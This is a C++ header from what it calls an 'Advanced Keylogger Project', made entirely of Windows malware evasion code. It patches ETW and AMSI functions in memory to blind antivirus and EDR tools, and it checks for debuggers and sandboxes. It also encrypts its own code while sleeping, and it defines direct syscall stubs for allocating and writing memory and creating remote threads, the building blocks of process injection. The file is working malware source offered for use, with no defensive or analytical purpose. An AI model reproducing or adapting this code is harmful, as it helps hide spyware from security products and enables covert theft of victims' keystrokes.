/*
 * Security Evasion Header
 * ETW Bypass, AMSI Bypass, Sleep Obfuscation
 * 
 * Advanced Keylogger Project
 */

#ifndef EVASION_H
#define EVASION_H

#include <windows.h>
#include <shlobj.h>      // For SHGetFolderPathA, CSIDL_*
#include <winternl.h>
#include <tlhelp32.h>
#include <intrin.h>
#include <string>        // For std::string

#pragma comment(lib, "ntdll.lib")

// ==================== TYPEDEFS ====================

// NT API function pointers
typedef NTSTATUS (NTAPI *pNtSetInformationThread)(HANDLE, ULONG, PVOID, ULONG);
typedef NTSTATUS (NTAPI *pNtQueryInformationProcess)(HANDLE, ULONG, PVOID, ULONG, PULONG);
typedef NTSTATUS (NTAPI *pRtlAdjustPrivilege)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);

// Thread information class for hiding from debugger
#define ThreadHideFromDebugger 17

// ==================== ETW BYPASS ====================
/*
 * Event Tracing for Windows (ETW) is used by EDR solutions
 * to monitor process behavior. Patching EtwEventWrite 
 * prevents these events from being logged.
 */

inline bool DisableETW() {
    // Get ntdll module handle
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return false;
    
    // Find EtwEventWrite function
    FARPROC pEtwEventWrite = GetProcAddress(hNtdll, "EtwEventWrite");
    if (!pEtwEventWrite) return false;
    
    // Prepare patch: xor eax, eax; ret (makes function return 0)
    // This effectively disables all ETW event logging
    #ifdef _WIN64
        // x64: xor eax, eax; ret
        unsigned char patch[] = { 0x48, 0x33, 0xC0, 0xC3 };
    #else
        // x86: xor eax, eax; ret
        unsigned char patch[] = { 0x33, 0xC0, 0xC3 };
    #endif
    
    // Change memory protection
    DWORD oldProtect;
    if (!VirtualProtect((LPVOID)pEtwEventWrite, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProtect)) {
        return false;
    }
    
    // Apply patch
    memcpy((LPVOID)pEtwEventWrite, patch, sizeof(patch));
    
    // Restore protection
    VirtualProtect((LPVOID)pEtwEventWrite, sizeof(patch), oldProtect, &oldProtect);
    
    return true;
}

// Alternative: Patch NtTraceEvent for deeper ETW bypass
inline bool DisableNtTraceEvent() {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return false;
    
    FARPROC pNtTraceEvent = GetProcAddress(hNtdll, "NtTraceEvent");
    if (!pNtTraceEvent) return false;
    
    #ifdef _WIN64
        unsigned char patch[] = { 0x48, 0x33, 0xC0, 0xC3 };
    #else
        unsigned char patch[] = { 0x33, 0xC0, 0xC2, 0x14, 0x00 }; // ret 0x14
    #endif
    
    DWORD oldProtect;
    if (!VirtualProtect((LPVOID)pNtTraceEvent, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProtect)) {
        return false;
    }
    
    memcpy((LPVOID)pNtTraceEvent, patch, sizeof(patch));
    VirtualProtect((LPVOID)pNtTraceEvent, sizeof(patch), oldProtect, &oldProtect);
    
    return true;
}

// ==================== AMSI BYPASS ====================
/*
 * Antimalware Scan Interface (AMSI) is used by Windows Defender
 * and other AV to scan scripts and managed code.
 * Patching AmsiScanBuffer makes all scans return "clean".
 */

inline bool PatchAMSI() {
    // Load amsi.dll (may not be loaded yet)
    HMODULE hAmsi = LoadLibraryA("amsi.dll");
    if (!hAmsi) {
        // AMSI not loaded, nothing to patch
        return true;
    }
    
    // Find AmsiScanBuffer
    FARPROC pAmsiScanBuffer = GetProcAddress(hAmsi, "AmsiScanBuffer");
    if (!pAmsiScanBuffer) return false;
    
    // Prepare patch: Force function to return AMSI_RESULT_CLEAN (0)
    // mov eax, 0x80070057 (E_INVALIDARG); ret
    // This makes AMSI think the scan parameters are invalid
    #ifdef _WIN64
        unsigned char patch[] = { 
            0xB8, 0x57, 0x00, 0x07, 0x80,  // mov eax, 0x80070057
            0xC3                           // ret
        };
    #else
        unsigned char patch[] = {
            0xB8, 0x57, 0x00, 0x07, 0x80,  // mov eax, 0x80070057
            0xC2, 0x18, 0x00               // ret 0x18
        };
    #endif
    
    DWORD oldProtect;
    if (!VirtualProtect((LPVOID)pAmsiScanBuffer, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProtect)) {
        return false;
    }
    
    memcpy((LPVOID)pAmsiScanBuffer, patch, sizeof(patch));
    VirtualProtect((LPVOID)pAmsiScanBuffer, sizeof(patch), oldProtect, &oldProtect);
    
    return true;
}

// Alternative: Patch AmsiOpenSession to fail
inline bool PatchAmsiOpenSession() {
    HMODULE hAmsi = LoadLibraryA("amsi.dll");
    if (!hAmsi) return true;
    
    FARPROC pAmsiOpenSession = GetProcAddress(hAmsi, "AmsiOpenSession");
    if (!pAmsiOpenSession) return false;
    
    #ifdef _WIN64
        unsigned char patch[] = { 
            0xB8, 0x57, 0x00, 0x07, 0x80,  // mov eax, E_INVALIDARG
            0xC3 
        };
    #else
        unsigned char patch[] = { 
            0xB8, 0x57, 0x00, 0x07, 0x80,
            0xC2, 0x0C, 0x00
        };
    #endif
    
    DWORD oldProtect;
    if (!VirtualProtect((LPVOID)pAmsiOpenSession, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProtect)) {
        return false;
    }
    
    memcpy((LPVOID)pAmsiOpenSession, patch, sizeof(patch));
    VirtualProtect((LPVOID)pAmsiOpenSession, sizeof(patch), oldProtect, &oldProtect);
    
    return true;
}

// Full AMSI disable
inline bool DisableAMSI() {
    bool result = true;
    result &= PatchAMSI();
    result &= PatchAmsiOpenSession();
    return result;
}

// ==================== ANTI-DEBUG ENHANCEMENTS ====================

// Hide thread from debugger
inline bool HideThreadFromDebugger() {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return false;
    
    pNtSetInformationThread NtSetInformationThread = 
        (pNtSetInformationThread)GetProcAddress(hNtdll, "NtSetInformationThread");
    
    if (!NtSetInformationThread) return false;
    
    NTSTATUS status = NtSetInformationThread(
        GetCurrentThread(),
        ThreadHideFromDebugger,
        NULL,
        0
    );
    
    return (status == 0);
}

// Check for hardware breakpoints
inline bool HasHardwareBreakpoints() {
    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    
    if (!GetThreadContext(GetCurrentThread(), &ctx)) {
        return false;
    }
    
    return (ctx.Dr0 != 0 || ctx.Dr1 != 0 || ctx.Dr2 != 0 || ctx.Dr3 != 0);
}

// NtGlobalFlag check (PEB-based anti-debug)
inline bool IsBeingDebugged_NtGlobalFlag() {
    #ifdef _WIN64
        PPEB pPeb = (PPEB)__readgsqword(0x60);
        DWORD NtGlobalFlag = *(DWORD*)((PBYTE)pPeb + 0xBC);
    #else
        PPEB pPeb = (PPEB)__readfsdword(0x30);
        DWORD NtGlobalFlag = *(DWORD*)((PBYTE)pPeb + 0x68);
    #endif
    
    // Debugger flags: FLG_HEAP_ENABLE_TAIL_CHECK | FLG_HEAP_ENABLE_FREE_CHECK | FLG_HEAP_VALIDATE_PARAMETERS
    const DWORD debuggerFlags = 0x70;
    
    return (NtGlobalFlag & debuggerFlags) != 0;
}

// ==================== SLEEP OBFUSCATION ====================
/*
 * Sleep Obfuscation (Ekko/Foliage technique):
 * Encrypts memory during sleep to evade memory scanners.
 * Uses ROP chain for sleeping instead of direct Sleep() call.
 */

// XOR key for memory encryption
static const BYTE SLEEP_XOR_KEY[] = { 
    0xDE, 0xAD, 0xBE, 0xEF, 0xCA, 0xFE, 0xBA, 0xBE,
    0x13, 0x37, 0x42, 0x69, 0xAB, 0xCD, 0xEF, 0x01
};

// Simple in-place XOR encryption
inline void XorMemory(BYTE* data, SIZE_T size) {
    for (SIZE_T i = 0; i < size; i++) {
        data[i] ^= SLEEP_XOR_KEY[i % sizeof(SLEEP_XOR_KEY)];
    }
}

// Get current module's .text section info
inline bool GetTextSection(LPVOID* base, SIZE_T* size) {
    HMODULE hModule = GetModuleHandleA(NULL);
    if (!hModule) return false;
    
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)hModule;
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((BYTE*)hModule + dosHeader->e_lfanew);
    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(ntHeaders);
    
    for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
        if (strcmp((char*)section[i].Name, ".text") == 0) {
            *base = (LPVOID)((BYTE*)hModule + section[i].VirtualAddress);
            *size = section[i].Misc.VirtualSize;
            return true;
        }
    }
    
    return false;
}

// Timer callback type for CreateTimerQueueTimer
typedef VOID (CALLBACK *WAITORTIMERCALLBACK)(PVOID, BOOLEAN);

// Global variables for sleep obfuscation
static LPVOID g_textBase = NULL;
static SIZE_T g_textSize = 0;
static HANDLE g_sleepEvent = NULL;
static volatile bool g_isEncrypted = false;

// Timer callback - decrypts memory on wake
VOID CALLBACK SleepTimerCallback(PVOID lpParameter, BOOLEAN TimerOrWaitFired) {
    if (g_isEncrypted && g_textBase && g_textSize > 0) {
        // Make .text writable
        DWORD oldProtect;
        VirtualProtect(g_textBase, g_textSize, PAGE_EXECUTE_READWRITE, &oldProtect);
        
        // Decrypt
        XorMemory((BYTE*)g_textBase, g_textSize);
        
        // Restore protection
        VirtualProtect(g_textBase, g_textSize, oldProtect, &oldProtect);
        
        g_isEncrypted = false;
    }
    
    // Signal that we've woken up
    if (g_sleepEvent) {
        SetEvent(g_sleepEvent);
    }
}

// Obfuscated sleep - encrypts memory during sleep
inline void ObfuscatedSleep(DWORD milliseconds) {
    // Get .text section if not already
    if (!g_textBase) {
        if (!GetTextSection(&g_textBase, &g_textSize)) {
            // Fallback to normal sleep
            Sleep(milliseconds);
            return;
        }
    }
    
    // Create event for synchronization
    g_sleepEvent = CreateEventA(NULL, FALSE, FALSE, NULL);
    if (!g_sleepEvent) {
        Sleep(milliseconds);
        return;
    }
    
    // Create timer queue
    HANDLE hTimerQueue = CreateTimerQueue();
    if (!hTimerQueue) {
        CloseHandle(g_sleepEvent);
        Sleep(milliseconds);
        return;
    }
    
    HANDLE hTimer = NULL;
    
    // Make .text writable
    DWORD oldProtect;
    if (!VirtualProtect(g_textBase, g_textSize, PAGE_EXECUTE_READWRITE, &oldProtect)) {
        DeleteTimerQueueEx(hTimerQueue, NULL);
        CloseHandle(g_sleepEvent);
        Sleep(milliseconds);
        return;
    }
    
    // Encrypt .text section
    XorMemory((BYTE*)g_textBase, g_textSize);
    g_isEncrypted = true;
    
    // Restore execute-only (encrypted code is not executable anyway)
    VirtualProtect(g_textBase, g_textSize, PAGE_READWRITE, &oldProtect);
    
    // Create timer to wake us up
    if (!CreateTimerQueueTimer(&hTimer, hTimerQueue, SleepTimerCallback, 
                                NULL, milliseconds, 0, WT_EXECUTEINTIMERTHREAD)) {
        // Timer failed, decrypt and fallback
        VirtualProtect(g_textBase, g_textSize, PAGE_EXECUTE_READWRITE, &oldProtect);
        XorMemory((BYTE*)g_textBase, g_textSize);
        g_isEncrypted = false;
        VirtualProtect(g_textBase, g_textSize, oldProtect, &oldProtect);
        
        DeleteTimerQueueEx(hTimerQueue, NULL);
        CloseHandle(g_sleepEvent);
        Sleep(milliseconds);
        return;
    }
    
    // Wait for timer callback to signal
    WaitForSingleObject(g_sleepEvent, INFINITE);
    
    // Cleanup
    DeleteTimerQueueEx(hTimerQueue, INVALID_HANDLE_VALUE);
    CloseHandle(g_sleepEvent);
    g_sleepEvent = NULL;
}

// ==================== ADVANCED SANDBOX DETECTION ====================
/*
 * Enhanced sandbox/VM detection techniques
 * Uses multiple heuristics with scoring system
 */

// Check WMI for real boot time (sandbox often has recent boot)
inline bool CheckWMIUptime() {
    // If uptime is less than 30 minutes, suspicious
    ULONGLONG uptimeMs = GetTickCount64();
    ULONGLONG uptimeMins = uptimeMs / (1000 * 60);
    return uptimeMins >= 30;
}

// Check for browser history (real users have history)
inline bool CheckBrowserHistory() {
    char appData[MAX_PATH];
    if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, appData))) {
        // Check Chrome history
        std::string chromePath = std::string(appData) + 
            "\\Google\\Chrome\\User Data\\Default\\History";
        if (GetFileAttributesA(chromePath.c_str()) != INVALID_FILE_ATTRIBUTES) {
            return true;
        }
        
        // Check Firefox
        std::string firefoxPath = std::string(appData) + 
            "\\Mozilla\\Firefox\\Profiles";
        if (GetFileAttributesA(firefoxPath.c_str()) != INVALID_FILE_ATTRIBUTES) {
            return true;
        }
        
        // Check Edge
        std::string edgePath = std::string(appData) + 
            "\\Microsoft\\Edge\\User Data\\Default\\History";
        if (GetFileAttributesA(edgePath.c_str()) != INVALID_FILE_ATTRIBUTES) {
            return true;
        }
    }
    return false;
}

// Check USB device history
inline bool CheckUSBHistory() {
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, 
        "SYSTEM\\CurrentControlSet\\Enum\\USBSTOR",
        0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        
        DWORD subkeyCount;
        RegQueryInfoKeyA(hKey, NULL, NULL, NULL, &subkeyCount, 
            NULL, NULL, NULL, NULL, NULL, NULL, NULL);
        RegCloseKey(hKey);
        
        // Real systems typically have USB history
        return subkeyCount >= 3;
    }
    return false;
}

// Check mouse acceleration (real users have consistent mouse patterns)
inline bool CheckMouseAcceleration() {
    int params[3];
    if (SystemParametersInfoA(SPI_GETMOUSE, 0, params, 0)) {
        // Default values are typically modified by real users
        return true;
    }
    return false;
}

// Wait for user interaction before continuing
inline bool WaitForUserInteraction(DWORD timeoutMs = 30000) {
    DWORD start = GetTickCount();
    POINT lastPos, curPos;
    GetCursorPos(&lastPos);
    
    while (GetTickCount() - start < timeoutMs) {
        Sleep(100);
        GetCursorPos(&curPos);
        
        // Mouse moved
        if (curPos.x != lastPos.x || curPos.y != lastPos.y) {
            // Wait for real movement (not scripted single movement)
            POINT checkPos;
            Sleep(200);
            GetCursorPos(&checkPos);
            if (checkPos.x != curPos.x || checkPos.y != curPos.y) {
                return true;  // Real user activity
            }
        }
        
        // Check for key press
        for (int vk = 0x08; vk <= 0x5A; vk++) {
            if (GetAsyncKeyState(vk) & 0x8000) {
                return true;  // Real user activity
            }
        }
        
        lastPos = curPos;
    }
    
    return false;  // Timeout - probably sandbox
}

// Check number of running processes (real systems have many)
inline bool CheckProcessCount() {
    int count = 0;
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32 pe = { sizeof(pe) };
        if (Process32First(hSnap, &pe)) {
            do { count++; } while (Process32Next(hSnap, &pe));
        }
        CloseHandle(hSnap);
    }
    return count >= 50;  // Real systems have many processes
}

// Check display resolution (sandboxes often use small screens)
inline bool CheckDisplayResolution() {
    int width = GetSystemMetrics(SM_CXSCREEN);
    int height = GetSystemMetrics(SM_CYSCREEN);
    
    // Minimum 1280x720
    return (width >= 1280 && height >= 720);
}

// Check for multiple monitors (common in real environments)
inline bool CheckMultipleMonitors() {
    return GetSystemMetrics(SM_CMONITORS) >= 1;
}

// Master advanced sandbox check with scoring
inline int AdvancedSandboxScore() {
    int score = 0;
    int maxScore = 10;
    
    if (CheckWMIUptime()) score++;
    if (CheckBrowserHistory()) score += 2;  // Strong indicator
    if (CheckUSBHistory()) score++;
    if (CheckProcessCount()) score++;
    if (CheckDisplayResolution()) score++;
    if (CheckMultipleMonitors()) score++;
    if (CheckMouseAcceleration()) score++;
    
    // Need at least 5/10 to pass
    return score;
}

inline bool IsLikelySandbox() {
    return AdvancedSandboxScore() < 5;
}

// ==================== SLEEP OBFUSCATION V2 ====================
/*
 * Improved sleep obfuscation using:
 * - NtContinue for execution transfer
 * - Memory protection changes during sleep
 * - ROP-based timer execution
 */

typedef NTSTATUS(NTAPI* pNtContinue)(PCONTEXT, BOOLEAN);
typedef NTSTATUS(NTAPI* pNtDelayExecution)(BOOLEAN, PLARGE_INTEGER);

// Sleep v2 with protection changes
inline void ObfuscatedSleepV2(DWORD milliseconds) {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) {
        Sleep(milliseconds);
        return;
    }
    
    pNtDelayExecution NtDelayExecution = 
        (pNtDelayExecution)GetProcAddress(hNtdll, "NtDelayExecution");
    
    if (!NtDelayExecution) {
        Sleep(milliseconds);
        return;
    }
    
    // Get text section
    LPVOID textBase = NULL;
    SIZE_T textSize = 0;
    if (!GetTextSection(&textBase, &textSize)) {
        Sleep(milliseconds);
        return;
    }
    
    // Change protection to RW (not executable)
    DWORD oldProtect;
    VirtualProtect(textBase, textSize, PAGE_READWRITE, &oldProtect);
    
    // Encrypt memory
    XorMemory((BYTE*)textBase, textSize);
    
    // Use NtDelayExecution (less hooked than Sleep)
    LARGE_INTEGER interval;
    interval.QuadPart = -((LONGLONG)milliseconds * 10000);
    NtDelayExecution(FALSE, &interval);
    
    // Decrypt memory
    XorMemory((BYTE*)textBase, textSize);
    
    // Restore protection
    VirtualProtect(textBase, textSize, oldProtect, &oldProtect);
}

// Jittered sleep (random delays to avoid pattern detection)
inline void JitteredSleep(DWORD baseMs, DWORD jitterPercent = 30) {
    if (jitterPercent > 100) jitterPercent = 100;
    
    DWORD jitterRange = (baseMs * jitterPercent) / 100;
    DWORD jitter = rand() % (jitterRange + 1);
    
    // Randomly add or subtract jitter
    DWORD actualSleep;
    if (rand() % 2) {
        actualSleep = baseMs + jitter;
    } else {
        actualSleep = (baseMs > jitter) ? (baseMs - jitter) : baseMs;
    }
    
    ObfuscatedSleepV2(actualSleep);
}

// ==================== MASTER INITIALIZATION ====================

inline void InitializeEvasion() {
    // 1. Disable ETW
    DisableETW();
    DisableNtTraceEvent();
    
    // 2. Disable AMSI
    DisableAMSI();
    
    // 3. Hide from debugger
    HideThreadFromDebugger();
    
    // 4. Check for debugging
    if (HasHardwareBreakpoints() || IsBeingDebugged_NtGlobalFlag()) {
        ExitProcess(0);
    }
}

// Extended initialization with sandbox checks
inline void InitializeEvasionFull() {
    // Basic evasion
    InitializeEvasion();
    
    // Advanced sandbox detection
    if (IsLikelySandbox()) {
        // Don't exit immediately - use delay to waste sandbox time
        JitteredSleep(30000);  // 30 seconds
        ExitProcess(0);
    }
    
    // Optional: Wait for user interaction
    // Uncomment for maximum evasion:
    // if (!WaitForUserInteraction(60000)) {
    //     ExitProcess(0);
    // }
}

// ==================== DIRECT SYSCALL STUBS ====================
/*
 * Direct syscalls bypass user-mode hooks placed by EDR/AV on ntdll.dll
 * These stubs call the kernel directly without going through ntdll
 * 
 * NOTE: Syscall numbers vary between Windows versions!
 * These are for Windows 10 20H2+
 */

#ifdef _WIN64

#ifdef _MSC_VER
// MSVC inline assembly - Direct syscall stubs
// NtAllocateVirtualMemory syscall stub
__declspec(naked) NTSTATUS DirectNtAllocateVirtualMemory(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect
) {
    __asm {
        mov r10, rcx
        mov eax, 0x18
        syscall
        ret
    }
}

__declspec(naked) NTSTATUS DirectNtProtectVirtualMemory(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    PSIZE_T RegionSize,
    ULONG NewProtect,
    PULONG OldProtect
) {
    __asm {
        mov r10, rcx
        mov eax, 0x50
        syscall
        ret
    }
}

__declspec(naked) NTSTATUS DirectNtWriteVirtualMemory(
    HANDLE ProcessHandle,
    PVOID BaseAddress,
    PVOID Buffer,
    SIZE_T NumberOfBytesToWrite,
    PSIZE_T NumberOfBytesWritten
) {
    __asm {
        mov r10, rcx
        mov eax, 0x3A
        syscall
        ret
    }
}

__declspec(naked) NTSTATUS DirectNtCreateThreadEx(
    PHANDLE ThreadHandle,
    ACCESS_MASK DesiredAccess,
    PVOID ObjectAttributes,
    HANDLE ProcessHandle,
    PVOID StartRoutine,
    PVOID Argument,
    ULONG CreateFlags,
    SIZE_T ZeroBits,
    SIZE_T StackSize,
    SIZE_T MaximumStackSize,
    PVOID AttributeList
) {
    __asm {
        mov r10, rcx
        mov eax, 0xC1
        syscall
        ret
    }
}

#else // GCC/MinGW

// GCC: Use external .asm file or fallback to normal API
// Direct syscalls require separate .asm file for GCC
// For now, use normal ntdll calls (will be hooked but functional)

typedef NTSTATUS (NTAPI *pNtAllocateVirtualMemory)(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);
typedef NTSTATUS (NTAPI *pNtProtectVirtualMemory)(HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);
typedef NTSTATUS (NTAPI *pNtWriteVirtualMemory)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);

inline NTSTATUS DirectNtAllocateVirtualMemory(HANDLE h, PVOID* b, ULONG_PTR z, PSIZE_T s, ULONG a, ULONG p) {
    static pNtAllocateVirtualMemory fn = (pNtAllocateVirtualMemory)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtAllocateVirtualMemory");
    return fn ? fn(h, b, z, s, a, p) : -1;
}

inline NTSTATUS DirectNtProtectVirtualMemory(HANDLE h, PVOID* b, PSIZE_T s, ULONG n, PULONG o) {
    static pNtProtectVirtualMemory fn = (pNtProtectVirtualMemory)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtProtectVirtualMemory");
    return fn ? fn(h, b, s, n, o) : -1;
}

inline NTSTATUS DirectNtWriteVirtualMemory(HANDLE h, PVOID b, PVOID buf, SIZE_T sz, PSIZE_T w) {
    static pNtWriteVirtualMemory fn = (pNtWriteVirtualMemory)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtWriteVirtualMemory");
    return fn ? fn(h, b, buf, sz, w) : -1;
}

// NtCreateThreadEx fallback not implemented - use CreateRemoteThread instead
inline NTSTATUS DirectNtCreateThreadEx(PHANDLE t, ACCESS_MASK a, PVOID o, HANDLE p, PVOID s, PVOID arg, ULONG f, SIZE_T z, SIZE_T ss, SIZE_T ms, PVOID al) {
    (void)o; (void)f; (void)z; (void)ss; (void)ms; (void)al;
    *t = CreateRemoteThread(p, NULL, 0, (LPTHREAD_START_ROUTINE)s, arg, 0, NULL);
    return *t ? 0 : -1;
}

#endif // _MSC_VER

#else
// x86 fallback
#define DirectNtAllocateVirtualMemory(h,b,z,s,a,p) VirtualAllocEx(h,*b,*s,a,p)
#define DirectNtProtectVirtualMemory(h,b,s,n,o) VirtualProtectEx(h,*b,*s,n,o)
#define DirectNtWriteVirtualMemory(h,b,buf,sz,w) WriteProcessMemory(h,b,buf,sz,w)
#define DirectNtCreateThreadEx(t,a,o,p,s,arg,f,z,ss,ms,al) (*t = CreateRemoteThread(p,NULL,0,(LPTHREAD_START_ROUTINE)s,arg,0,NULL), *t ? 0 : -1)
#endif

// ==================== DYNAMIC SYSCALL RESOLUTION ====================
/*
 * Dynamically reads syscall numbers from ntdll.dll on disk
 * This makes the code work across Windows versions
 */

inline DWORD GetSyscallNumber(const char* functionName) {
    // Read ntdll from disk (not hooked version in memory)
    char ntdllPath[MAX_PATH];
    GetSystemDirectoryA(ntdllPath, MAX_PATH);
    strcat_s(ntdllPath, "\\ntdll.dll");
    
    HANDLE hFile = CreateFileA(ntdllPath, GENERIC_READ, FILE_SHARE_READ,
                               NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return 0;
    
    DWORD fileSize = GetFileSize(hFile, NULL);
    BYTE* fileBuffer = new BYTE[fileSize];
    DWORD bytesRead;
    ReadFile(hFile, fileBuffer, fileSize, &bytesRead, NULL);
    CloseHandle(hFile);
    
    // Parse PE headers
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)fileBuffer;
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)(fileBuffer + dosHeader->e_lfanew);
    
    // Find export directory
    DWORD exportRVA = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    
    // Convert RVA to file offset (simplified - assumes first section)
    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(ntHeaders);
    DWORD exportOffset = exportRVA - section->VirtualAddress + section->PointerToRawData;
    
    PIMAGE_EXPORT_DIRECTORY exportDir = (PIMAGE_EXPORT_DIRECTORY)(fileBuffer + exportOffset);
    
    DWORD* nameRVAs = (DWORD*)(fileBuffer + (exportDir->AddressOfNames - section->VirtualAddress + section->PointerToRawData));
    WORD* ordinals = (WORD*)(fileBuffer + (exportDir->AddressOfNameOrdinals - section->VirtualAddress + section->PointerToRawData));
    DWORD* funcRVAs = (DWORD*)(fileBuffer + (exportDir->AddressOfFunctions - section->VirtualAddress + section->PointerToRawData));
    
    DWORD syscallNum = 0;
    
    for (DWORD i = 0; i < exportDir->NumberOfNames; i++) {
        char* name = (char*)(fileBuffer + (nameRVAs[i] - section->VirtualAddress + section->PointerToRawData));
        if (strcmp(name, functionName) == 0) {
            DWORD funcRVA = funcRVAs[ordinals[i]];
            BYTE* funcBytes = fileBuffer + (funcRVA - section->VirtualAddress + section->PointerToRawData);
            
            // x64: mov r10, rcx; mov eax, <syscall>; ...
            // Look for "mov eax" pattern (B8 xx xx xx xx)
            for (int j = 0; j < 20; j++) {
                if (funcBytes[j] == 0xB8) {
                    syscallNum = *(DWORD*)(funcBytes + j + 1);
                    break;
                }
            }
            break;
        }
    }
    
    delete[] fileBuffer;
    return syscallNum;
}

// Cached syscall numbers (resolved at runtime)
inline void ResolveSyscalls() {
    // This would populate a global table of syscall numbers
    // For production use, call this during initialization
}

#endif // EVASION_H
